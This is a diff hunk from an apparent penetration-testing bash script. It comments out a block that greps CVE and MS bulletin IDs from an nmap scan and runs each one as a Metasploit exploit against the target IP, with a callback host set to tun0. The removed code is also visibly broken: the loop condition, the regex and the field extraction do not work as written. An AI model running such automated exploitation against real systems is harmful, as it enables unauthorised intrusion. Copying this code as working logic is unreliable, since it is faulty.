@@ -204,14 +204,14 @@ then
 fi
 
 # Execute discovered exploits (use with caution and proper authorization!)
-read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
-if [[ $executeExploits =~ ^[yY]$ ]]; then
-    while read -r line
-    echo "\033[31m$line\033[0m"
-    do
-        exploitPath=$(echo "$line" | cut -d ":" -f 1)
-        exploitName=$(echo "$line" | cut -d ":" -f 2)
-        echo "Executing $exploitName..."
-        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; run; exit;"
-    done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
-fi
+#read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
+#if [[ $executeExploits =~ ^[yY]$ ]]; then
+#    while read -r line
+#    echo "\033[31m$line\033[0m"
+#    do
+#        exploitPath=$(echo "$line" | cut -d ":" -f 1)
+#        exploitName=$(echo "$line" | cut -d ":" -f 2)
+#        echo "Executing $exploitName..."
+#        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; run; exit;"
+#    done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
+#fi
